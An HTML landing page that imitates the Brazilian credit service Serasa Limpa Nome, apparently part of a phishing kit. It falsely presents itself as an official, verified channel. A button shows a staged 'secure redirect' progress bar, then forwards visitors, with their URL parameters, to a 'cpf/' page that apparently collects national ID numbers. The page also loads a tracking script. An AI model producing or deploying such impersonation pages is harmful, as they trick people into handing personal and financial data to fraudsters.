<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
<title>Serasa Limpa Nome - Verifique as ofertas</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
<style>
:root{--rosa:#e6006f;--rosa-escuro:#c2005f;--sombra:0 18px 45px rgba(0,0,0,.12),0 8px 18px rgba(0,0,0,.06);--raio:20px;--gradiente:linear-gradient(135deg,#e6006f 0%,#ff4da0 100%)}
*{box-sizing:border-box}html,body{height:100%}
body{margin:0;background:#e6006f;font-family:'Inter',system-ui,-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;color:#111;display:flex;justify-content:center;min-height:100vh}
.wrap{text-align:center;width:100%;max-width:580px;padding:0 20px;display:flex;flex-direction:column;align-items:center;margin-top:90px;margin-bottom:80px}
.detalhe-imagem{display:block;width:min(420px,92vw);max-height:380px;height:auto;object-fit:contain;margin-bottom:-60px;opacity:.96;pointer-events:none;filter:drop-shadow(0 10px 18px rgba(0,0,0,.18));animation:flutuar 4s ease-in-out infinite}
@keyframes flutuar{0%,100%{transform:translateY(0)}50%{transform:translateY(-6px)}}
.card{background:#fff;border-radius:var(--raio);box-shadow:var(--sombra);padding:38px 26px 28px;position:relative;z-index:1;width:100%;animation:fadeInUp .7s ease forwards}
@keyframes fadeInUp{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
.headline{margin:8px 0 10px;font-size:clamp(22px,5.2vw,28px);font-weight:800;color:var(--rosa);letter-spacing:.8px;text-transform:uppercase;text-shadow:0 2px 4px rgba(0,0,0,.1)}
.subtexto{font-size:15px;color:#555;margin-bottom:24px;line-height:1.5}
.cta{width:100%;border:none;border-radius:14px;padding:15px 18px;background:var(--gradiente);color:#fff;font-size:clamp(16px,4.2vw,18px);font-weight:700;cursor:pointer;box-shadow:0 8px 25px rgba(230,0,111,.4);transition:.15s}
.cta:hover{box-shadow:0 10px 28px rgba(230,0,111,.55)}.cta:active{transform:scale(.98);opacity:.9}
.overlay{position:absolute;inset:0;background:#fff;border-radius:var(--raio);display:none;align-items:center;justify-content:center;flex-direction:column;gap:10px;z-index:10}
.overlay.mostrar{display:flex}
.barra{width:82%;max-width:420px;height:12px;border-radius:999px;background:#eee;overflow:hidden}
.barra i{display:block;height:100%;width:0%;background:var(--gradiente);animation:progresso 1.3s forwards}
@keyframes progresso{to{width:100%}}
.mini-texto{font-size:12px;color:#888}
@media (max-width:480px){.detalhe-imagem{width:min(380px,96vw);max-height:340px;margin-bottom:-40px}}
</style>
<script src="js/track.js" defer></script>
</head>
<body>
<main class="wrap" id="app">
  <img src="img/presell.webp" alt="Serasa Limpa Nome - verifique as ofertas" class="detalhe-imagem" width="1080" height="1440" loading="eager" fetchpriority="high" decoding="async">
  <section class="card">
    <h1 class="headline">VERIFIQUE AS OFERTAS</h1>
    <p class="subtexto">Este é um canal oficial e verificado para realizar a consulta com segurança.</p>
    <button id="cta" class="cta" type="button">Realizar Consulta Agora</button>
    <div id="overlay" class="overlay">
      <div class="barra"><i></i></div>
      <span class="mini-texto">redirecionando com segurança...</span>
    </div>
  </section>
</main>
<script>
(function(){
  var LOADING_MS=1300,cta=document.getElementById('cta'),overlay=document.getElementById('overlay');
  cta.onclick=function(){
    overlay.classList.add('mostrar');
    setTimeout(function(){
      window.location.href=(window.__withParams?window.__withParams('cpf/'):'cpf/'+window.location.search);
    },LOADING_MS);
  };
})();
</script>
</body>
</html>
